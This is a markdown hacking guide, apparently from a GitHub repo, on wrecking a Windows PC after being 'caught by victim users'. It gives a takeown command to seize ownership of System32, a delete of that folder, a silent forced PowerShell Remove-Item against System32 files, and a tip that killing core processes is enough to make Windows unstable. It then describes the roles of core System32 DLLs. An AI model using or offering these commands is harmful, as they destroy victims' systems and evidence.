# Destructing Windows PC !
If you made any error or get caughten by some victim users , The best option is to Destruct or Delete the datas > making windows unstable . One of the 3 ways am going to tell you . it is gonna be awesome

## system32

The system32 is a core file in Windows Machines . It contains critical system files and libraries that are essential for the proper functioning of the Windows operating system. The files in the System32 folder are necessary for running programs and applications, as well as for maintaining the stability and security of the operating system.

## How can i manipulate system32 folder!

Nowadays windows has maken this folder a lot more securer !. Even admin not have access to .. 
<br>WTF ! Then How <br><br>
There is an way !
<br>
<br>
### Using takeown command
    takeown /F System32 /R
    
```
del .\system32 or \system32
```
takeown command will give owner permission to admin user. owner can modify or Del anything !!
/F -> Folder <br>
/R -> apply for folder ,subflolders and its Files

### Powerscripts
```
$path = "C:\Windows\System32\file_name.exe" ;
Remove-Item $path -Force -ErrorAction SilentlyContinue
```
Remove specfic file using the above command
### Pic 
Me doing an test in one of my college PC'S :) <br><br>
<img src="https://raw.githubusercontent.com/Whitecat18/Ps-script-for-Hackers-and-Pentesters/main/source/windows-ps-script.jpeg" height=350>
<br><br>

# Understanding system32
As an Pentester (Exploit Dev or Rev Eng) or an Hacker . You should Understand what and how windows is stable ie their working mecanics !
<br> You dont need to learn everything . Just in some cases look through the sheets . Gud to GO

#### Basic files that stables and runs windows .
Tip: killing some main process is enough to make windows unstable ! . Dont need to delete whole folder :)
<br>

-   `ntoskrnl.exe`: The Windows NT kernel is the core component of the operating system that manages system resources, including memory, hardware devices, and processes.
    
-   `hal.dll`: The Hardware Abstraction Layer is a layer of software that allows the operating system to communicate with hardware devices.
    
-   `win32k.sys`: This file contains the kernel-mode portion of the Windows graphics subsystem and is responsible for managing the display of graphical elements on the screen.
    
-   `user32.dll`: This dynamic link library contains functions used by user-level applications to interact with the Windows operating system, including managing windows, menus, and input events.
    
-   `kernel32.dll`: This dynamic link library contains functions used by both user-level applications and system-level components to perform tasks such as memory management, thread management, and file input/output.
    
-   `advapi32.dll`: This dynamic link library contains functions used by system-level components to perform tasks such as registry access, security management, and event logging.


-   `msvcrt.dll`: This dynamic link library contains functions used by many applications to perform basic C runtime operations, such as memory allocation and string manipulation.
    
-   `rpcrt4.dll`: This dynamic link library contains functions used by the Remote Procedure Call (RPC) system, which is used by many Windows components to communicate with each other.

-    `netapi32.dll`: This dynamic link library contains functions used by the networking subsystem, including managing network connections and accessing network resources.
    
-   `ole32.dll`: This dynamic link library contains functions used by many Windows components to implement COM and OLE functionality, which is used for inter-process communication and object-oriented programming.
    
-   `gdi32.dll`: This dynamic link library contains functions used by many Windows components to perform graphics-related tasks, such as drawing images and text on the screen.
    
-   `shlwapi.dll`: This dynamic link library contains functions used by many Windows components to perform common string and file manipulation tasks.
    
-   `shell32.dll`: This dynamic link library contains functions used by many Windows components to implement the Windows shell, including managing the desktop, taskbar, and file explorer.


-   `advpack.dll`: This dynamic link library contains functions used by many Windows components to perform installation and configuration tasks, such as installing software and updating system settings.
    
-   `comctl32.dll`: This dynamic link library contains functions used by many Windows components to implement common controls, such as buttons, menus, and dialog boxes.

-   `usp10.dll`: This dynamic link library contains functions used by many Windows components to implement advanced typography and text layout features, including bidirectional text and complex scripts.

-   `ws2_32.dll`: This dynamic link library contains functions used by many Windows components to implement the Winsock API, which is used for network communication.
    
-   `userenv.dll`: This dynamic link library contains functions used by many Windows components to manage user profiles, including user-specific settings and preferences.
    
-   `crypt32.dll`: This dynamic link library contains functions used by many Windows components to perform cryptographic operations, such as encrypting and decrypting data.

-   `mpr.dll`: This dynamic link library contains functions used by many Windows components to implement the Multiple Provider Router, which is used for managing network connections and resources.
    
-   `setupapi.dll`: This dynamic link library contains functions used by many Windows components to perform device installation and configuration tasks, such as installing drivers and managing hardware devices.
    
-   `cfgmgr32.dll`: This dynamic link library contains functions used by many Windows components to manage system configuration, including hardware profiles and device configuration.
    
-   `eventlog.dll`: This dynamic link library contains functions used by many Windows components to implement the Event Logging system, which is used for tracking system events and errors.
    
-   `aclui.dll`: This dynamic link library contains functions used by many Windows components to implement the Access Control List Editor, which is used for managing file and folder permissions.
    
-   `version.dll`: This dynamic link library contains functions used by many Windows components to manage file version information, including checking the version of installed software and libraries.
